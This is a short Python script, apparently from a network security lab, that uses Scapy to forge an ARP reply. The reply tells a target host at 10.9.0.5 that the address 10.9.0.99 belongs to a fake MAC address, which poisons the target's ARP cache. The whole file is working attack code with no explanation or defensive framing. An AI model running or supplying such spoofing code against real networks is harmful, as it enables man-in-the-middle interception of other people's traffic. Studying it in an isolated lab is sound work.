from scapy.all import *

target_IP = '10.9.0.5'

fake_IP = '10.9.0.99'
fake_MAC = 'aa:bb:cc:dd:ee:ff'

target_MAC = input("Target MAC Address: ")

ether1 = Ether(src = fake_MAC, dst = target_MAC)
arp1 = ARP(psrc = fake_IP, hwsrc = fake_MAC,
        pdst = target_IP, hwdst = target_MAC)
arp1.op = 2
frame1 = ether1/arp1

sendp(frame1)